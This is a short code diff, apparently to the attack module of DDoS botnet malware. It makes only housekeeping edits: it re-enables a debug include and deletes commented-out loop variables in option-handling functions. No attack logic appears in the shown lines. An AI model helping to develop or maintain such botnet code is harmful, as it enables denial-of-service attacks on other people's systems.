@@ -1,8 +1,8 @@
 #define _GNU_SOURCE
-/*
+
 #ifdef DEBUG
 #include <stdio.h>
-#endif*/
+#endif
 #include <stdlib.h>
 #include <unistd.h>
 #include <signal.h>
@@ -192,8 +192,6 @@ void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct 
 
 char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)
 {
-    //int i;
-
     for (int i = 0; i < opts_len; i++)
     {
         if (opts[i].key == opt) return opts[i].val;
@@ -235,8 +233,6 @@ static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)
 
 static void free_opts(struct attack_option *opts, int len)
 {
-    //int i;
-
     if (opts == NULL)
         return;
 
